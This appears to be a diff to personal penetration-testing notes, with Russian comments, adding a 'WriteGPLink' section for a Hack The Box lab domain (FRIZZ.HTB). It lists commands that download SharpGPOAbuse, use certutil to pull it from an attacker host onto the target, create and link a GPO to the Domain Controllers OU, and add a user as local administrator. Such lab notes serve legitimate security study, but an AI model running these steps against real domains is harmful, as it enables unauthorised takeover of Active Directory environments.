@@ -94,6 +94,18 @@ Silvercore_21
      replace: userAccountControl
      userAccountControl: 512
      )
+# WriteGPLink
+
+    # скачаем SharpGPOAbuse
+    $ wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
+    # загрузим его на удаленную машину
+    psh> certutil -urlcache -f http://10.10.16.31:4243/SharpGPOAbuse.exe SharpGPOAbuse.exe
+    # создадим новую групповую политику pwn
+    psh> New-GPO -Name pwn | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
+    # используем созданную групповую политику pwn для добавления себя в локальные администраторы
+    psh> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName pwn
+    # явно применяем групповые политики
+    psh> gpupdate /force
 
 # WriteOwner
 
